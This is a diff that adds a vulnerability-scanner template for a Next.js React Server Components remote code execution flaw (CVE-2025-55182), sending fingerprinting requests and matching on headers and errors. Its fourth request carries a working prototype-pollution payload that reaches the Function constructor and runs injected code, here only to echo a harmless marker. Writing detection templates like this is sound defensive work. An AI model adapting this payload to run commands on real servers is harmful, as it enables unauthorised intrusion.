@@ -1,0 +1,218 @@
+id: CVE-2025-55182
+
+info:
+  name: Next.js React Server Components - Remote Code Execution
+  author: sumanrox
+  severity: critical
+  description: |
+    Next.js applications using React Server Components are vulnerable to remote code execution 
+    through unsafe prototype property access during deserialization of the React Flight Protocol.
+    The vulnerability allows attackers to achieve RCE via prototype pollution chains, enabling 
+    arbitrary command execution on vulnerable Next.js servers.
+    
+    This template implements multi-layered detection including:
+    - Passive fingerprinting (headers, content patterns)
+    - Active RSC probing
+    - REACT2SHELL_PROBE benign marker detection
+    - Error-based detection
+    
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-55182
+    - https://github.com/sumanrox/rschunter
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2025-55182
+    cwe-id: CWE-1321
+  metadata:
+    max-request: 5
+  tags: cve,cve2025,nextjs,rce,react,prototype-pollution,rsc
+
+variables:
+  react2shell_marker: "REACT2SHELL_PROBE_{{randstr}}"
+
+http:
+  - raw:
+      # Request 1: Passive fingerprinting
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+      # Request 2: RSC header probing
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        RSC: 1
+        Accept: text/x-component
+
+      # Request 3: Next.js data endpoint check
+      - |
+        GET /_next/data HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        RSC: 1
+
+      # Request 4: REACT2SHELL_PROBE - Benign marker detection
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Next-Action: x
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="0"
+
+        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\": \"$B0\"}","_response":{"_prefix":"throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'{{react2shell_marker}}'});","_formData":{"get":"$1:constructor:constructor"}}}
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="1"
+
+        "$@0"
+        ------WebKitFormBoundary--
+
+      # Request 5: Alternative endpoint test (/_next/data path)
+      - |
+        POST /_next/data HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Next-Action: test
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="0"
+
+        {"then":"$1:__proto__:constructor"}
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="1"
+
+        {}
+        ------WebKitFormBoundary--
+
+    matchers-condition: or
+    matchers:
+      # High confidence - REACT2SHELL_PROBE marker detected
+      - type: dsl
+        name: react2shell-probe-confirmed
+        dsl:
+          - 'contains(body_4, react2shell_marker)'
+          - 'status_code_4 >= 500'
+        condition: and
+
+      # High confidence - Multiple RSC indicators
+      - type: dsl
+        name: rsc-multiple-indicators
+        dsl:
+          - 'contains(tolower(header_1), "x-powered-by: next.js")'
+          - 'contains(tolower(body_1), "__next_data__") || contains(tolower(body_1), "window.__next_f")'
+          - 'contains(tolower(header_1), "vary") && (contains(tolower(header_1), "rsc") || contains(tolower(header_1), "next-router"))'
+        condition: and
+
+      # Medium confidence - RSC Content-Type
+      - type: dsl
+        name: rsc-content-type
+        dsl:
+          - 'contains(tolower(content_type_2), "text/x-component")'
+          - 'status_code_2 == 200'
+        condition: and
+
+      # Medium confidence - Middleware headers (critical exploit condition)
+      - type: dsl
+        name: middleware-headers-present
+        dsl:
+          - 'contains(tolower(header_1), "x-middleware-rewrite") || contains(tolower(header_1), "x-middleware-subrequest")'
+          - 'contains(tolower(header_1), "x-powered-by: next.js")'
+        condition: and
+
+      # Medium confidence - Next.js prerender indicators (Shodan-identified)
+      - type: dsl
+        name: shodan-indicators
+        dsl:
+          - 'contains(tolower(header_1), "x-nextjs-prerender")'
+          - 'contains(tolower(header_1), "x-nextjs-stale-time")'
+          - 'contains(tolower(header_1), "x-powered-by: next.js")'
+        condition: and
+
+      # Error-based detection
+      - type: dsl
+        name: error-based-detection
+        dsl:
+          - 'status_code_4 >= 500 || status_code_5 >= 500'
+          - 'contains(tolower(body_4), "digest") || contains(tolower(body_5), "digest")'
+          - 'contains(tolower(body_4), "next_redirect") || contains(tolower(body_4), "react") || contains(tolower(body_5), "syntaxerror")'
+        condition: and
+
+      # Flight Protocol patterns
+      - type: regex
+        name: flight-protocol-patterns
+        regex:
+          - '(?m)^\d+:["IHL]'
+          - '"\\$L\d+"'
+          - '"\\$@\d+"'
+        part: body
+        condition: or
+
+    extractors:
+      # Extract Next.js version
+      - type: regex
+        name: nextjs-version
+        part: header
+        group: 1
+        regex:
+          - 'X-Powered-By:\s*Next\.js\s+([\d.]+)'
+
+      # Extract middleware headers
+      - type: kval
+        name: middleware-headers
+        part: header
+        kval:
+          - x-middleware-rewrite
+          - x-middleware-subrequest
+          - x-nextjs-prerender
+          - x-nextjs-stale-time
+
+      # Extract Vary header for RSC analysis
+      - type: kval
+        name: vary-header
+        part: header
+        kval:
+          - Vary
+
+      # Extract error digest (if present)
+      - type: regex
+        name: error-digest
+        part: body
+        group: 1
+        regex:
+          - '"digest":"([^"]+)"'
+
+      # Extract React Flight chunk patterns
+      - type: regex
+        name: flight-chunks
+        part: body
+        regex:
+          - '\d+:[A-Z]\{[^}]+\}'
+
+# Enhanced detection metadata
+# This template is designed for comprehensive CVE-2025-55182 detection
+# 
+# Detection Layers:
+# 1. Passive: Headers, content patterns, version detection
+# 2. Active: RSC probing, endpoint enumeration
+# 3. Error-based: REACT2SHELL_PROBE benign marker
+# 4. Behavioral: Flight Protocol patterns, middleware detection
+#
+# Confidence Levels:
+# - High: REACT2SHELL_PROBE confirmed, multiple RSC indicators
+# - Medium: Middleware headers, Shodan indicators, RSC Content-Type
+# - Low: Flight Protocol patterns (requires additional validation)
+#
+# Author: Suman Roy (@sumanrox)
+# GitHub: https://github.com/sumanrox
+# Website: https://sumanroy.in
+# Tool: https://github.com/sumanrox/rschunter
+#
+# Research Credits:
+# - Security community - Attack surface analysis
